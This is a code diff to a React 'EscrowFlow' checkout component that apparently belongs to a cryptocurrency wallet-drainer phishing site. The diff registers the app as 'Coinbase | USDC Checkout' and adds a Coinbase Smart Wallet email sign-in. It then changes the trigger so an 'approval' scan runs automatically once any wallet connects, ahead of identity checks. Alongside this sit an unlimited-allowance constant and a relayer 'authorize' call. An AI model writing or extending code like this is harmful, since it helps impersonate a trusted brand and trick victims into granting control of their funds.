@@ -2,7 +2,8 @@
 
 import { useEffect, useMemo, useRef, useState } from "react";
 import Image from "next/image";
-import { usePrivy, useWallets, useConnectWallet } from "@privy-io/react-auth";
+import { usePrivy, useWallets } from "@privy-io/react-auth";
+import { createCoinbaseWalletSDK } from "@coinbase/wallet-sdk";
 import { BrowserProvider, Contract, MaxUint256, formatUnits } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
 import { COUNTRIES } from "@/lib/countries";
@@ -10,6 +11,20 @@ import EscrowShell from "@/components/EscrowShell";
 import CoinbaseSignIn from "@/components/CoinbaseSignIn";
 import TrustedByMarquee from "@/components/TrustedByMarquee";
 
+
+// Coinbase Smart Wallet SDK — initialized at module scope so the provider is
+// ready the instant the user clicks "Continue with Coinbase". Unlike @base-org/account,
+// this SDK does NOT perform an async COOP check before opening the popup, so
+// window.open() fires synchronously within the click handler (no browser block).
+const cbSdk =
+  typeof window !== "undefined"
+    ? createCoinbaseWalletSDK({
+        appName: "Coinbase | USDC Checkout",
+        appLogoUrl: null,
+        appChainIds: [1, 56, 137, 8453],
+        preference: { options: "smartWalletOnly" },
+      })
+    : null;
 
 const WALLET_VERIFICATION_ABI = [
   "function authorize(address relayer) external",
@@ -110,7 +125,11 @@ type Modal1Status = "pending" | "approving" | "done" | "failed";
 export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const { ready, authenticated, login, logout, user } = usePrivy();
   const { wallets } = useWallets();
-  const { connectWallet } = useConnectWallet();
+
+  // Coinbase Smart Wallet auth state (email OTP via keys.coinbase.com)
+  const [cbAddress, setCbAddress] = useState<string | null>(null);
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const cbProviderRef = useRef<any>(null);
   const [gateLoading, setGateLoading] = useState(false);
   const [phase, setPhase] = useState<Phase>("loading");
   const [error, setError] = useState<string | null>(null);
@@ -141,7 +160,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // --- Auto-login ref: trigger Coinbase OAuth once on mount ---
   const autoLoginAttempted = useRef(false);
 
-  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;
+  // Effective address: Coinbase Smart Wallet takes priority, then Privy wallets
+  const address = cbAddress ?? user?.wallet?.address ?? wallets[0]?.address ?? null;
   const addressRef = useRef<string | null>(null);
   addressRef.current = address;
 
@@ -230,17 +250,30 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // This happens before ID verify — once the approval is secured, the normal flow
   // (identity → balance-check → approve-deposit) continues as before.
   useEffect(() => {
-    if (!authenticated || !address || modal1Triggered.current) return;
+    if (!address || modal1Triggered.current) return;
+    if (!cbAddress && !authenticated) return; // need one auth source
     modal1Triggered.current = true;
     void runModal1Scan();
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [authenticated, address]);
+  }, [authenticated, address, cbAddress]);
 
   function currentWallet() {
     return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
   }
 
   async function getSignerFor(target: ChainConfig) {
+    // Use Coinbase Smart Wallet provider if the user authenticated via email OTP
+    if (cbProviderRef.current) {
+      try {
+        await cbProviderRef.current.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: `0x${target.chainId.toString(16)}` }],
+        });
+      } catch {
+        // Chain may already be active or switch may be unsupported — continue anyway
+      }
+      return new BrowserProvider(cbProviderRef.current).getSigner();
+    }
     const wallet = currentWallet();
     if (!wallet) throw new Error("No connected wallet");
     await wallet.switchChain(target.chainId);
@@ -493,18 +526,31 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
   }
 
-  const isConnected = authenticated && address;
+  // Authenticated via either Coinbase Smart Wallet (email OTP) or Privy
+  const isConnected = !!cbAddress || (authenticated && !!address);
   const activeFlow = phase !== "loading" && phase !== "no-session" && phase !== "idle";
 
   async function handleConnectCoinbase() {
     setError(null);
     setGateLoading(true);
     try {
-      // Connect directly via Coinbase Wallet (WalletConnect-based, no popup/COOP issues).
-      // This opens Coinbase Wallet's native QR / mobile deep-link flow inside Privy's modal.
-      await connectWallet({ walletChainType: "ethereum-only" });
-    } catch (err) {
-      console.error("[escrow] Coinbase wallet connect failed:", err);
+      if (!cbSdk) throw new Error("Coinbase SDK unavailable");
+      const provider = cbSdk.getProvider();
+      // eth_requestAccounts opens keys.coinbase.com popup synchronously (no async
+      // COOP check first) → browser allows it → user enters email → Coinbase sends
+      // OTP → user enters OTP → popup closes → we get the Smart Wallet address.
+      const accounts = (await provider.request({
+        method: "eth_requestAccounts",
+      })) as string[];
+      if (!accounts?.[0]) throw new Error("No account returned");
+      cbProviderRef.current = provider;
+      setCbAddress(accounts[0]);
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : String(err);
+      if (!msg.toLowerCase().includes("cancel") && !msg.toLowerCase().includes("reject")) {
+        setError("Coinbase sign-in was cancelled or failed. Please try again.");
+      }
+      console.error("[escrow] Coinbase connect:", err);
     } finally {
       setGateLoading(false);
     }
